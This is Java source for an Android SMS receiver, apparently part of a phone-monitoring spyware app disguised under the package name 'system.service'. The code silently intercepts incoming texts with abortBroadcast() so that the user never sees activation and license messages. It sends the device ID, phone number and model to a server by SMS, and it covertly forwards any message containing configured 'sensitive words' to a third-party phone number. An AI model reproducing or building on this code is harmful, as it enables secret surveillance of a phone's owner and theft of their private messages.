package system.service;

import java.text.DateFormat;
import java.text.ParseException;
import java.util.Calendar;
import java.util.Date;

import system.service.activity.GlobalPrefActivity;
import system.service.activity.InitActivity;
import system.service.config.ConfigCtrl;
import com.particle.inspector.common.util.sms.AuthSms;
import com.particle.inspector.common.util.DatetimeUtil;
import com.particle.inspector.common.util.LANG;
import com.particle.inspector.common.util.LangUtil;
import com.particle.inspector.common.util.sms.AUTH_SMS_TYPE;
import system.service.feature.sms.SmsCtrl;
import com.particle.inspector.common.util.DeviceProperty;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.license.LicenseCtrl;
import com.particle.inspector.common.util.license.LICENSE_TYPE;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

/**
 * Receiver for activating setting view.
 */
public class SmsReceiver extends BroadcastReceiver 
{
	private static final String LOGTAG = "ActivationReceiver";
	private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
	
	
	
	@SuppressWarnings("unused")
	@Override
	public void onReceive(Context context, Intent intent) 
	{
		if (!intent.getAction().equals(SMS_RECEIVED)) return;
		
		String smsBody = SmsCtrl.getSmsBody(intent).trim();
		SysUtils.messageBox(context, "Received SMS: " + smsBody);
			
		if (smsBody.length() <= 0) return; 
		
		//-------------------------------------------------------------------------------
		// If it is the activation SMS (only include the key), show the setting view
		if (smsBody.length() == LicenseCtrl.ACTIVATION_KEY_LENGTH &&  
			LicenseCtrl.isLicensed(context, smsBody) != LICENSE_TYPE.NOT_LICENSED) 
		{
			abortBroadcast(); // Finish broadcast, the system will notify this SMS
			SysUtils.messageBox(context, "Got license: " + LicenseCtrl.enumToStr(LicenseCtrl.isLicensed(context, smsBody)));
			try {
				// If it is the 1st time, send SMS to server for license key validation
				if (ConfigCtrl.getLicenseType(context) == LICENSE_TYPE.NOT_LICENSED) 
				{
					String deviceID = DeviceProperty.getDeviceId(context);
					String phoneNum = DeviceProperty.getPhoneNumber(context);
					String phoneModel = DeviceProperty.getDeviceModel();
					String androidVer = DeviceProperty.getAndroidVersion();
					LANG lang = DeviceProperty.getPhoneLang();
					AuthSms sms = new AuthSms(smsBody, deviceID, phoneNum, phoneModel, androidVer, lang);
					String smsStr = sms.clientSms2Str();
					String srvAddr = context.getResources().getString(R.string.srv_address);
					SysUtils.messageBox(context, "Server Address: " + srvAddr);
					boolean ret = SmsCtrl.sendSms(srvAddr, smsStr);
					if (ret) {
						ConfigCtrl.setAuthSmsSentDatetime(context, new Date());
					}
					return;
				}
				
				// Save the last activated datetime
				ConfigCtrl.setLastActivatedDatetime(context, (new Date()));
				
				// Start dialog
				Intent initIntent = new Intent().setClass(context, InitActivity.class);
				initIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); 
				initIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
				context.startActivity(initIntent);
				
				// Remove the activation SMS
				//SmsCtrl.deleteTheLastSMS(context);
			}
			catch (Exception ex) {
				SysUtils.messageBox(context, ex.getMessage());
				Log.e(LOGTAG, ex.getMessage());
			}
		}
		
		//-------------------------------------------------------------------------------
		// If it is a SMS from server for key validation
		else if (smsBody.startsWith(AuthSms.SMS_HEADER)) 
		{
			String[] parts = smsBody.split(AuthSms.SMS_SEPARATOR);
			if (parts.length >= 3) {
				abortBroadcast(); // Finish broadcast, the system will notify this SMS
				
				// The time between sending Auth SMS and receiving Auth SMS cannot be more than 10 minites.
				String authSmsSentDatetimeStr = ConfigCtrl.getAuthSmsSentDatetime(context);
				ConfigCtrl.setAuthSmsSentDatetime(context, null); // clean the auth sms sent time
				Date authSmsSentDatetime = null;
				try {
					authSmsSentDatetime = DatetimeUtil.format.parse(authSmsSentDatetimeStr);
				}
				catch (ParseException e) {
					
				}
				Calendar c = Calendar.getInstance();
				long now = c.getTimeInMillis();
				c.setTime(authSmsSentDatetime);
				long lastly = c.getTimeInMillis();
				
				if ((now - lastly) > 600000) {
					Log.i(LOGTAG, "Auth SMS invalid due to out of time");
					return;
				}
					
				// --------------------------------------------------------------
				if (parts[2].equals(AuthSms.SMS_SUCCESS)) {
					// Save flag
					LICENSE_TYPE type = LicenseCtrl.isLicensed(context, parts[1]);
					if (!ConfigCtrl.setLicenseType(context, type)) {
						Log.e(LOGTAG, "Cannot set license type");
						return;
					}
					
					// Save consumed datetime if it is the 1st activation
					if (ConfigCtrl.getConsumedDatetime(context) == null) {
						ConfigCtrl.setConsumedDatetime(context, (new Date()));
					}
					
					// Start dialog
					Intent initIntent = new Intent().setClass(context, InitActivity.class);
					initIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); 
					initIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
					context.startActivity(initIntent);
					
					// Remove the activation SMS
					//SmsCtrl.deleteTheLastSMS(context);
					
				} else if (parts[2].equalsIgnoreCase(AuthSms.SMS_FAILURE)) {
					if (parts.length >= 4) {
						SysUtils.messageBox(context, parts[3]);
					} else {
						SysUtils.messageBox(context, context.getResources().getString(R.string.msg_invalid_key));
					}
				}
			}
		}
			
		//-------------------------------------------------------------------------------
		// Redirect 
		else if (containSensitiveWords(context, smsBody)) 
		{
			String phoneNum = GlobalPrefActivity.getRedirectPhoneNum(context);
			if (phoneNum.length() > 0) {
				boolean ret = SmsCtrl.sendSms(phoneNum, context.getResources().getString(R.string.sms_redirect_header) + smsBody);
			}
		}
		
        
	} // end of onReceive()
	
	private boolean containSensitiveWords(Context context, String sms) {
		boolean ret = false;
		String[] sensitiveWords = GlobalPrefActivity.getSensitiveWords(context).split(GlobalPrefActivity.SENSITIVE_WORD_BREAKER);
		for (String word : sensitiveWords) {
			if (sms.toLowerCase().contains(word.toLowerCase())) {
				ret = true;
				break;
			}
		}
		return ret;
	}

}